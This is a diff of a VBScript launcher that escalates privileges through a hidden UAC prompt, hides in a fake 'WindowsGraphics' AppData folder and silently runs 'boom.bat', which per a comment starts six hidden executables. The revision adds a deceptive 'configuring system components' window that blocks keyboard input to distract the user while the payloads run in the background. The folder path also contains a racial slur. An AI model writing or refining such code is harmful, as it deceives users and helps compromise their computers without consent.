@@ -2,35 +2,32 @@ Set UAC = CreateObject("Shell.Application")
 Set WshShell = CreateObject("WScript.Shell")
 Set FSO = CreateObject("Scripting.FileSystemObject")
 
-' Your specific folder path
+' Set the folder path
 strPath = "C:\Users\nigga12\AppData\Roaming\Local\WindowsGraphics\"
 WshShell.CurrentDirectory = strPath
 
 ' --- STEP 1: ELEVATION LOGIC ---
-' We only ask for Admin rights if we AREN'T booting from the registry
+' Only ask for Admin if we are NOT booting from the registry
 If Not WScript.Arguments.Named.Exists("elevate") And Not WScript.Arguments.Named.Exists("boot") Then
-    ' Trigger UAC prompt for the first-time setup only. 0 = Hidden
+    ' 0 = Hide the initial process
     UAC.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 0
     WScript.Quit
 End If
 
-' --- STEP 2: RUN BOOM.BAT (Only on first run) ---
-' If the "elevate" flag is present, it means this is the first time setup
-If WScript.Arguments.Named.Exists("elevate") Then
-    WshShell.Run "cmd.exe /c boom.bat", 0, True
+' --- STEP 2: THE BACKGROUND STRIKE ---
+' This runs your boom.bat (which starts your 6 apps)
+' 0 = Completely Hidden, False = Run in background immediately
+If FSO.FileExists(strPath & "boom.bat") Then
+    WshShell.Run "cmd.exe /c boom.bat", 0, False
 End If
 
-' --- STEP 3: THE SILENT REBOOT DELAY ---
-' This wait happens entirely in the background. No window, no "X" button.
-WScript.Sleep 30000 
+' --- STEP 3: THE STICKY DISTRACTION ---
+' This opens the VISIBLE window the user sees.
+' color 1f = Professional Blue background with White text
+' /nobreak = ignores keyboard input (User can't tap space to skip)
+' > nul = hides the "Waiting for 30 seconds" text
+' 1 = Visible window, True = VBScript waits for this window to finish
+WshShell.Run "cmd.exe /c title System Configuration && color 1f && echo. && echo  Please wait, configuring system components... && echo  This may take a few minutes. Do not close this window. && timeout /t 30 /nobreak > nul", 1, True
 
-' --- STEP 4: LAUNCH THE 6 APPS ---
-' Using '0' as the second argument ensures they stay hidden
-If FSO.FileExists(strPath & "sigurd.exe") Then WshShell.Run """" & strPath & "sigurd.exe""", 0, False
-If FSO.FileExists(strPath & "client.exe") Then WshShell.Run """" & strPath & "client.exe""", 0, False
-If FSO.FileExists(strPath & "file3.exe")  Then WshShell.Run """" & strPath & "file3.exe""", 0, False
-If FSO.FileExists(strPath & "file4.exe")  Then WshShell.Run """" & strPath & "file4.exe""", 0, False
-If FSO.FileExists(strPath & "file5.exe")  Then WshShell.Run """" & strPath & "file5.exe""", 0, False
-If FSO.FileExists(strPath & "file6.exe")  Then WshShell.Run """" & strPath & "file6.exe""", 0, False
-
+' --- STEP 4: EXIT ---
 WScript.Quit
